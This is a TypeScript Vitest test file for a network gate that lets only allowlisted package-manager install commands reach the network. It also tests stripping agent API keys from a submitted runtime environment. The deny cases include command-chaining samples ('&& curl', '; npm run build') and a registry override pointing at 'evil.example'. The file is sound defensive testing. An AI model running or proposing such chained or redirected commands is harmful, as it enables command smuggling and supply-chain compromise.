import { describe, expect, it } from "vitest";

import {
  createSubmittedRuntimeEnv,
  evaluateDependencyNetworkRequest,
} from "./dependency-network-gate";

describe("evaluateDependencyNetworkRequest", () => {
  it.each([
    "npm ci",
    "npm ci --ignore-scripts",
    "npm ci --omit=dev",
    "npm ci --include=dev --ignore-scripts",
    "npm install",
    "npm install --ignore-scripts",
    "npm install --legacy-peer-deps",
    "npm install --force",
    "pnpm install",
    "pnpm install --frozen-lockfile",
    "pnpm install --ignore-scripts",
    "pnpm install --prod=false",
    "yarn install",
    "yarn install --frozen-lockfile",
    "yarn install --immutable",
    "yarn install --ignore-scripts",
    "bun install",
    "bun install --frozen-lockfile",
    "bun install --no-save",
    "corepack pnpm install --frozen-lockfile",
    "corepack yarn install --immutable",
  ])("allows dependency install command: %s", (command) => {
    expect(
      evaluateDependencyNetworkRequest({
        command,
        reason: "dependency-install",
      }),
    ).toEqual({ status: "allowed" });
  });

  it("denies network access when the reason is not dependency installation", () => {
    const result = evaluateDependencyNetworkRequest({
      command: "bun run build",
      reason: "demo-build",
    });

    expect(result).toEqual({
      reason:
        "Outbound network access is only allowed for dependency installation.",
      status: "denied",
    });
  });

  it.each([
    "npm install left-pad",
    "pnpm add react",
    "yarn add vite",
    "bun add react",
    "npm run build",
    "bun install && curl https://example.com",
    "npm ci; npm run build",
    "pnpm install | tee install.log",
    "yarn install > install.log",
    "npm ci --registry=https://evil.example",
    "sh -c 'npm ci'",
  ])("denies non-allowlisted network command: %s", (command) => {
    expect(
      evaluateDependencyNetworkRequest({
        command,
        reason: "dependency-install",
      }),
    ).toEqual({
      reason:
        "Dependency installation network access is limited to allowlisted package-manager install commands.",
      status: "denied",
    });
  });
});

describe("createSubmittedRuntimeEnv", () => {
  it("keeps safe runtime variables while removing agent-only secrets and OpenCode settings", () => {
    const env = createSubmittedRuntimeEnv({
      ANTHROPIC_API_KEY: "secret",
      HOME: "/home/agent",
      NODE_ENV: "production",
      OPENCODE_ENABLE_EXA: "1",
      OPENAI_API_KEY: "secret",
      PATH: "/usr/local/bin:/usr/bin",
      VITE_PUBLIC_DEMO_MODE: "1",
    });

    expect(env).toEqual({
      HOME: "/home/agent",
      NODE_ENV: "production",
      PATH: "/usr/local/bin:/usr/bin",
      VITE_PUBLIC_DEMO_MODE: "1",
    });
  });
});
